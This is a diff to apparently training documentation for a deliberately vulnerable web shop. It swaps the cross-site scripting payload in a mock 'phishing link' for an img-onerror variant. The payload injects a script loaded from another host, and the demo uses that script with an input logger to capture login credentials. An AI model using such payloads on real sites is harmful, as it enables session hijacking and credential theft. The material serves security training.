@@ -203,7 +203,7 @@ can download this
 [docker-compose](https://raw.githubusercontent.com/wurstbrot/shake-logger/master/docker-compose.yml)-file
 and run `docker-compose up` to start the juice-shop and the
 shake-logger. Assume you received and (of course) clicked
-[this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cscript%3Evar%20js%20%3Ddocument.createElement%28%22script%22%29;js.type%20%3D%20%22text%2Fjavascript%22;js.src%3D%22http:%2F%2Flocalhost:8080%2Fshake.js%22;document.body.appendChild%28js%29;varhash%3Dwindow.location.hash;window.location.hash%3Dhash.substr%280,8%29;%3C%2Fscript%3Eapple)
+[this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cimg+src%3Dx+onerror%3D%27var+js%3Ddocument.createElement%28%22script%22%29%3Bjs.type+%3D+%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar+hash%3Dwindow.location.hash%3Bwindow.location.hash%3Dhash.substr%280%2C8%29%3B%27%2F%3Eapple)
 and login. Apart from the visual/audible effect, the attacker also
 installed [an input logger](http://localhost:8080/logger.php) to grab
 credentials! This could easily run on a 3rd party server in real life!
